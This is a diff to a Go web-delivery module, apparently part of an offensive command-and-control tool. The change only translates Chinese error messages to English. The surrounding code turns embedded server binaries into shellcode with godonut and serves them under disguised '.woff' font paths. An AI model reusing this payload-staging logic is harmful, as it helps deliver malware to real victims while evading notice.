@@ -36,7 +36,7 @@ func StartWebDelivery(c *gin.Context) {
 	}
 	var w database.WebDelivery
 	if exist, _ := database.Engine.Where("listening_port = ?", web.Port).Exist(&w); exist {
-		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口已被配置"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + " port already configured"})
 		return
 	}
 
@@ -45,7 +45,7 @@ func StartWebDelivery(c *gin.Context) {
 		logger.Error("检测端口 %s 时发生错误: %v\n", web.Port, err)
 	}
 	if inUse {
-		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + " port already in use"})
 		return
 	}
 
@@ -59,13 +59,13 @@ func StartWebDelivery(c *gin.Context) {
 	// 查找符合条件的文件
 	binaryFileName := findBinary(listenerType, osType, archType)
 	if binaryFileName == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "no matching server file"})
 		return
 	}
 	// 从嵌入的文件系统中读取对应文件内容
 	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "failed to read file"})
 		return
 	}
 	var modifiedData []byte
@@ -114,7 +114,7 @@ func StartWebDelivery(c *gin.Context) {
 	if web.OS == "windows" {
 		shellcode, err := godonut.GenShellcode(modifiedData, web.Pass, web.Arch)
 		if err != nil {
-			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "failed to generate shellcode"})
 			return
 		}
 		mux.HandleFunc("/"+web.Filename+".woff", func(w http.ResponseWriter, r *http.Request) {
@@ -190,7 +190,7 @@ func OpenWebDelivery(c *gin.Context) {
 		logger.Error("检测端口 %s 时发生错误: %v\n", web.Port, err)
 	}
 	if inUse {
-		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + " port already in use"})
 		return
 	}
 	var webdelivery database.WebDelivery
@@ -206,12 +206,12 @@ func OpenWebDelivery(c *gin.Context) {
 	// 查找符合条件的文件
 	binaryFileName := findBinary(listenerType, osType, archType)
 	if binaryFileName == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "no matching server file"})
 	}
 	// 从嵌入的文件系统中读取对应文件内容
 	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "failed to read file"})
 	}
 
 	var modifiedData []byte
@@ -261,7 +261,7 @@ func OpenWebDelivery(c *gin.Context) {
 	if wd.OS == "windows" {
 		shellcode, err := godonut.GenShellcode(modifiedData, wd.Pass, wd.Arch)
 		if err != nil {
-			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "failed to generate shellcode"})
 		}
 		mux.HandleFunc("/"+wd.FileName+".woff", func(w http.ResponseWriter, r *http.Request) {
 			// 设置响应头，指定内容类型为二进制流
